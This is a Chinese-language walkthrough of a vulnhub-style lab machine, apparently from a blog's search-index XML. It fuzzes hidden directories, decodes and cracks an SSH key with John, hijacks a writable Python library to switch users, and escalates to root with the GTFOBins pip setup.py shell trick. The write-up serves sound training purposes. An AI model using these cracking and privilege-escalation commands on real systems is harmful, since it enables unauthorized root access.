-<p>开放22、80端口，同时<code>robots.txt</code>中提示有个名为<code>/~myfiles</code>的目录</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111194123394.png" alt="image-20220111194123394"></p>
-<p>假的404页面</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111193628871.png" alt="image-20220111193628871"></p>
-<p>查看源码发现提示信息”Your can do it, keep trying.”</p>
-<h3 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111195222767.png" alt="image-20220111195222767"></p>
-<p>通过fuzz发现了另外一个目录<code>~secret</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111195711410.png" alt="image-20220111195711410"></p>
-<p>筛选一下有用的信息</p>
-<blockquote>
-<p>疑似用户名：icex64 </p>
-<p>这个目录下藏有ssh的私钥</p>
-<p>用 fasttrack 破解密码</p>
-</blockquote>
-<p>继续fuzz</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -u &quot;http://192.168.221.131/~secret/.FUZZ&quot; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -fc 403 -e .txt,.html</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111201339971.png" alt="image-20220111201339971"></p>
-<p>发现了<code>.mysecret.txt</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111201618284.png" alt="image-20220111201618284"></p>
-<p>直接看不像是private key应该是编码过了，试了几种Base发现是base58 <a href="http://www.hiencode.com/base58w.html">解码点这</a></p>
-<p>解码后得到sshkey</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111201903152.png" alt="image-20220111201903152"></p>
-<h3 id="John"><a href="#John" class="headerlink" title="John"></a>John</h3><p>利用ssh2john获取sshkey的哈希值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/john/ssh2john.py sshkey &gt; hash</span><br></pre></td></tr></table></figure>
-
-<p>再用John破解得到密码为<strong>P@55w0rd!</strong> </p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/fasttrack.txt hash</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220111205221667.png" alt="image-20220111205221667"></p>
-<p>通过已知用户<strong>icex64</strong>连接ssh，获得一个flag</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112132931220.png" alt="image-20220112132931220"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code>发现用户有权以<strong>arsene</strong>身份运行<strong>heist.py</strong>且免密</p>
-<p>查看<strong>webbrowser.py</strong>为任意用户可读写执行，利用python库劫持来利用该文件</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112134653023.png" alt="image-20220112134653023"></p>
-<h3 id="Python库劫持"><a href="#Python库劫持" class="headerlink" title="Python库劫持"></a>Python库劫持</h3><p>Python库劫持的方法后续会再写一篇文章来详细学习一下</p>
-<p>这里因为<strong>heist.py</strong>调用了<strong>webbrowser.py</strong>且该文件任意用户可写，直接在该文件中调用<code>/bin/bash</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112145242986.png" alt="image-20220112145242986"></p>
-<p>现在可以直接通过<strong>heist.py</strong>来切换为<strong>arsene</strong>用户</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py</span><br></pre></td></tr></table></figure>
-
-<h3 id="利用pip来Getshell"><a href="#利用pip来Getshell" class="headerlink" title="利用pip来Getshell"></a>利用pip来Getshell</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112150413564.png" alt="image-20220112150413564"></p>
-<p>简单看看<strong>arsene</strong>用户目录下，其中<strong>note.txt</strong>就是先前网页上看到的提示信息，其他没啥有用的</p>
-<p><code>sudo -l</code>发现用户有权以 <strong>root</strong> 身份执行<strong>pip</strong>且免密</p>
-<p>在<a href="https://gtfobins.github.io/">GTFOBins</a>上直接就有pip提权的方法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt; $TF/setup.py</span><br><span class="line">pip install $TF</span><br></pre></td></tr></table></figure>
-
-<p>这里直接利用以上三条命令就可获得root权限</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112152050911.png" alt="image-20220112152050911"></p>
-<p>root flag在**/root**目录下</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220112152225053.png" alt="image-20220112152225053"></p>
-<p>end</p>
-]]></content>
-      <tags>
-        <tag>渗透测试</tag>
-        <tag>vulhub</tag>
       </tags>
   </entry>
 </search>
